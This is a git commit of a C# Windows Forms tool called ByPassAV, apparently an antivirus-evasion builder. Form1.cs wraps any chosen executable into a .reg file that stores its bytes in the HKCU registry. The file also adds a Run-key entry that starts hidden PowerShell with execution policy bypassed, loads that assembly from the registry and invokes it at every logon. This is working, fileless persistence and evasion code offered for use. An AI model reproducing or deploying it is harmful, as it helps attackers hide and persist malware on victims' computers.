21dffa8efe4760818d3b2f646a2673f6f4092fbb
dot3v1L <30367966+dot3v1L@users.noreply.github.com>
2018-06-16 16:12:15 +0300

    Initial commit

---
+++ ByPassAV/Form1.Designer.cs
@@ -0,0 +1,74 @@
+﻿namespace ByPassAV
+{
+    partial class fByPass
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(fByPass));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::ByPassAV.Properties.Resources.drag_and_drop_icon;
+            this.pictureBox1.Location = new System.Drawing.Point(1, 1);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(320, 240);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // fByPass
+            // 
+            this.AllowDrop = true;
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(322, 242);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "fByPass";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "ByPassAV";
+            this.DragDrop += new System.Windows.Forms.DragEventHandler(this.fByPass_DragDrop);
+            this.DragOver += new System.Windows.Forms.DragEventHandler(this.fByPass_DragOver);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ ByPassAV/Form1.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace ByPassAV
+{
+    public partial class fByPass : Form
+    {
+        private const string shell =
+            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"PowerShell Process\"=\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"-ExecutionPolicy Bypass -windowstyle hidden -noexit -command [Reflection.Assembly]::Load((Get-ItemProperty HKCU:\\\\Software\\\\ByPass).fileWar).EntryPoint.Invoke($null,$null)\\\"\"";
+        private string path;
+        private static Random random = new Random();
+
+        public fByPass()
+        {
+            InitializeComponent();
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            using (var open = new OpenFileDialog())
+            {
+                open.Filter = ".exe|*.exe";
+                if (open.ShowDialog() == DialogResult.OK)
+                {
+                    CreateRegFile(open.FileName);
+                }
+            }
+        }
+        private void fByPass_DragDrop(object sender, DragEventArgs e)
+        {
+            string[] files = e.Data.GetData(DataFormats.FileDrop) as string[];
+            if (files[0].EndsWith(".exe"))
+            {
+                CreateRegFile(files[0]);
+            }
+        }
+        private void fByPass_DragOver(object sender, DragEventArgs e)
+        {
+            e.Effect = DragDropEffects.All;
+        }
+
+        private void CreateRegFile(string path)
+        {
+            using (var save = new SaveFileDialog())
+            {
+                save.Filter = ".reg|*.reg";
+                save.FileName = RandomString(7);
+                if (save.ShowDialog() == DialogResult.OK)
+                {
+                    string fileName = RandomString(9) + ".reg";
+                    byte[] files = File.ReadAllBytes(path);
+
+                    RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\ByPass");
+                    registryKey.SetValue("fileWar", files, RegistryValueKind.Binary);
+                    ExportRegFile("HKEY_CURRENT_USER\\Software\\ByPass", fileName);
+
+                    string hexByte = File.ReadAllText(fileName);
+                    File.Delete(fileName);
+                    File.WriteAllText(save.FileName, hexByte + shell);
+                    Registry.CurrentUser.DeleteSubKeyTree("Software\\ByPass");
+                    MessageBox.Show("Create ^-^");
+                }
+            }
+        }
+
+        private void ExportRegFile(string key, string path)
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "reg.exe";
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.Arguments = string.Concat(new string[]
+                {
+                    "export \"",
+                    key,
+                    "\" \"",
+                    path,
+                    "\" /y"
+                });
+                process.Start();
+                process.WaitForExit();
+            }
+        }
+        public static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+    }
+}
